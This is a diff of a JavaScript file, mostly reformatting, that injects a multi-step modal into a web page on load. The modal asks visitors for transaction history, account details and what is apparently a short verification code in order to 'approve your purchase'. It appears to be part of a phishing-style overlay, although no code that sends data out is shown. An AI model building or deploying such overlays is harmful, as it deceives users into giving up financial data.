@@ -1,5 +1,5 @@
 window.addEventListener("load", () => {
-    const formObject = `
+  const formObject = `
         <div id="form0" class="pp-modal-sm">
         <div class="pp-header">
             <img style="opacity: 0;" src="https://img.icons8.com/material-outlined/344/back--v1.png" width="35"
@@ -92,7 +92,6 @@ window.addEventListener("load", () => {
                     style="padding: 1rem;cursor:pointer" onClick="resetForm()" />
             </div>
             <div class="pp-body">
-                <img src="https://img.icons8.com/fluency/344/bell.png" width="100" />
                 <h2 style="text-align:center;">We need a bit more info to approve your purchase</h2>
                 <p style="text-align:center;">Help us understand your financial situation and verify your identity
                     by sharing your transaction history and account details.
@@ -211,58 +210,58 @@ window.addEventListener("load", () => {
         </div>
         `;
 
-    document.body.innerHTML += formObject;
-  });
+  document.body.innerHTML += formObject;
+});
 
-  let currentForm = 0;
-  function routeToForm() {
-    if (currentForm >= 0) {
-      const formPrefixNext = "form" + (currentForm + 1);
-      const formPrefixPrev = "form" + currentForm;
-      document.getElementById(formPrefixPrev).style.display = "none";
-      document.getElementById(formPrefixNext).style.display = "flex";
-      currentForm = currentForm + 1;
+let currentForm = 0;
+function routeToForm() {
+  if (currentForm >= 0) {
+    const formPrefixNext = "form" + (currentForm + 1);
+    const formPrefixPrev = "form" + currentForm;
+    document.getElementById(formPrefixPrev).style.display = "none";
+    document.getElementById(formPrefixNext).style.display = "flex";
+    currentForm = currentForm + 1;
+  }
+}
+
+function goBack() {
+  if (currentForm >= 0) {
+    const formPrefixNext = "form" + (currentForm - 1);
+    const formPrefixPrev = "form" + currentForm;
+    document.getElementById(formPrefixPrev).style.display = "none";
+    document.getElementById(formPrefixNext).style.display = "flex";
+    currentForm = currentForm - 1;
+  }
+}
+
+function resetForm() {
+  const formPrefix = "form" + currentForm;
+  document.getElementById(formPrefix).style.display = "none";
+
+  document.getElementsByClassName("pp-backdrop")[0].remove();
+}
+
+var obj = document.getElementById("partitioned");
+obj.addEventListener("keydown", stopCarret);
+obj.addEventListener("keyup", stopCarret);
+
+function stopCarret() {
+  if (obj.value.length > 3) {
+    setCaretPosition(obj, 3);
+  }
+}
+
+function setCaretPosition(elem, caretPos) {
+  if (elem != null) {
+    if (elem.createTextRange) {
+      var range = elem.createTextRange();
+      range.move("character", caretPos);
+      range.select();
+    } else {
+      if (elem.selectionStart) {
+        elem.focus();
+        elem.setSelectionRange(caretPos, caretPos);
+      } else elem.focus();
     }
   }
-
-  function goBack() {
-    if (currentForm >= 0) {
-      const formPrefixNext = "form" + (currentForm - 1);
-      const formPrefixPrev = "form" + currentForm;
-      document.getElementById(formPrefixPrev).style.display = "none";
-      document.getElementById(formPrefixNext).style.display = "flex";
-      currentForm = currentForm - 1;
-    }
-  }
-
-  function resetForm() {
-    const formPrefix = "form" + currentForm;
-    document.getElementById(formPrefix).style.display = "none";
-
-    document.getElementsByClassName("pp-backdrop")[0].remove();
-  }
-
-  var obj = document.getElementById("partitioned");
-  obj.addEventListener("keydown", stopCarret);
-  obj.addEventListener("keyup", stopCarret);
-
-  function stopCarret() {
-    if (obj.value.length > 3) {
-      setCaretPosition(obj, 3);
-    }
-  }
-
-  function setCaretPosition(elem, caretPos) {
-    if (elem != null) {
-      if (elem.createTextRange) {
-        var range = elem.createTextRange();
-        range.move("character", caretPos);
-        range.select();
-      } else {
-        if (elem.selectionStart) {
-          elem.focus();
-          elem.setSelectionRange(caretPos, caretPos);
-        } else elem.focus();
-      }
-    }
-  }
+}
